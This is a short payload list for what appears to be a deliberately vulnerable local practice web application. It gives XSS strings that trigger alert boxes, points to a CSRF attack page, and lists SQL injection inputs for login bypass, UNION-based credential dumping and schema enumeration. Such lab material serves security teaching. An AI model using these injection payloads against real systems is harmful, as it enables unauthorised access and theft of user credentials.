# Attack Payloads

## 1. Reflected XSS
http://localhost:3001/api/greet?name=<script>alert('XSS-Reflected')</script>

## 2. Stored XSS
Comment payload:
<img src=x onerror="alert('Stored XSS')">

## 3. DOM-based XSS
http://localhost:3001/#<img src=x onerror=alert('DOM-XSS')>

## 4. CSRF
Open vulnerable/frontend/csrf-attack.html while logged in.

## 5. SQL Injection - Easy (Login Bypass)
Username: admin' OR 1=1#
Password: anything

## 6. SQL Injection - Intermediate (UNION)
Search: ' UNION SELECT id, username, password FROM users#

## 7. SQL Injection - Advanced
Stage 1 - Column count:      1 ORDER BY 6#
Stage 2 - Tables:            -1 UNION SELECT 1,group_concat(table_name),3,4,5,6 FROM information_schema.tables WHERE table_schema=database()#
Stage 3 - Columns of users:  -1 UNION SELECT 1,group_concat(column_name),3,4,5,6 FROM information_schema.columns WHERE table_name='users'#
Stage 4 - Dump credentials:  -1 UNION SELECT id,username,password,email,role FROM users#
